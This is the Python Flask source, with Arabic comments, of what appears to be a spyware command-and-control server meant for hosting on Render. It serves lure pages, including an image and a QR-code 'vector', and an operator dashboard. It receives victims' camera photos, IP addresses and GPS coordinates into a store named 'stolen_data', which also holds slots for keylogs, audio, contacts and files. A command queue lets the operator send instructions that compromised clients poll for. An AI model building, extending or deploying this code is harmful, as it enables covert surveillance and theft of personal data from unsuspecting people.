from flask import Flask, render_template, request, jsonify
import os
from datetime import datetime

# إعداد المسارات المطلقة لضمان عمل templates على سيرفر Render
base_dir = os.path.abspath(os.path.dirname(__file__))
app = Flask(__name__, 
            template_folder=os.path.join(base_dir, 'templates'),
            static_folder=os.path.join(base_dir, 'static'))

# تخزين البيانات في الذاكرة (للعرض السريع)
stolen_data = {
    "photos": [],
    "audio": [],
    "keylogs": [],
    "locations": [],
    "contacts": [],
    "files": []
}
pending_commands = []

# ===== الصفحات الرئيسية (تأكد من وجود الملفات داخل مجلد templates) =====
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/image')
def image_vector():
    return render_template('image.html')

@app.route('/qr')
def qr_vector():
    return render_template('qr.html')

@app.route('/dashboard')
def dashboard():
    # هذا الرابط سيفتح لوحة التحكم الآن
    return render_template('dashboard.html')

# ===== API البيانات للوحة التحكم =====
@app.route('/api/dashboard/data')
def dashboard_data():
    return jsonify(stolen_data)

# ===== استقبال البيانات (الكاميرا، الموقع، الخ) =====
@app.route('/api/upload/photo', methods=['POST'])
def upload_photo():
    data = request.json
    if data and 'image' in data:
        stolen_data["photos"].append({
            "timestamp": datetime.now().isoformat(),
            "ip": request.remote_addr,
            "camera": data.get('camera', 'unknown'),
            "full_image": data['image']
        })
    return jsonify({"status": "ok"})

@app.route('/api/upload/location', methods=['POST'])
def upload_location():
    data = request.json
    if data:
        stolen_data["locations"].append({
            "timestamp": datetime.now().isoformat(),
            "lat": data.get('lat'),
            "lng": data.get('lng')
        })
    return jsonify({"status": "ok"})

# ===== أوامر التحكم (Polling) =====
@app.route('/api/command/send', methods=['POST'])
def send_command():
    data = request.json
    if not data or 'type' not in data:
        return jsonify({"status": "error"}), 400
    cmd = {"id": str(len(pending_commands) + 1), "type": data['type'], "params": data.get('params', {})}
    pending_commands.append(cmd)
    return jsonify({"status": "ok"})

@app.route('/api/command/poll')
def poll():
    if pending_commands:
        return jsonify({"command": pending_commands.pop(0)})
    return jsonify({"command": None})

# ===== التشغيل المتوافق مع Render =====
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
